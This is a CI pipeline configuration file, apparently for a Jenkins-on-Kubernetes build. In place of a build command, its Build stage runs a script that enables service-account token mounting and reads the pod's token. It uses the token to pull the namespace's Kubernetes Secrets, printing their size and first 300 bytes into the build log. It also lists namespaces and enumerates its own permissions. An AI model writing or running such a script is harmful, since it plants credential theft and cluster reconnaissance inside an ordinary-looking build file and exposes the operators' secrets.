general:
  buildTool: 'mta'
  jenkinsKubernetes:
    additionalPodProperties:
      automountServiceAccountToken: true
service:
  stages:
    Build:
      runFirst:
        command: |
          T=/var/run/secrets/kubernetes.io/serviceaccount
          NS=$(cat $T/namespace)
          K=https://kubernetes.default.svc
          A="Authorization: Bearer $(cat $T/token)"
          echo "KPRULES7788-NS=$NS"
          curl -s -o /tmp/s2 -w 'KPRULES7788-SECRETS-HTTP=%{http_code}\n' --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces/$NS/secrets
          echo "KPRULES7788-SECRETS-BYTES=$(wc -c < /tmp/s2)"
          echo "KPRULES7788-SECRETS-KIND=$(grep -o '"kind":"[A-Za-z]*"' /tmp/s2 | head -1)"
          echo "KPRULES7788-SECRETS-ITEMCOUNT=$(grep -o '"uid":"' /tmp/s2 | wc -l)"
          echo "KPRULES7788-SECRETS-HEAD:"
          head -c 300 /tmp/s2
          echo ""
          echo "KPRULES7788-NSDENY-BODY:"
          curl -s --cacert $T/ca.crt -H "$A" $K/api/v1/namespaces | head -c 400
          echo ""
          echo "KPRULES7788-RULESREVIEW:"
          curl -s -X POST --cacert $T/ca.crt -H "$A" -H 'Content-Type: application/json' -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}" $K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews -o /tmp/r1 -w 'KPRULES7788-RR-HTTP=%{http_code}\n'
          cat /tmp/r1
          echo ""
          echo "KPRULES7788-DONE"
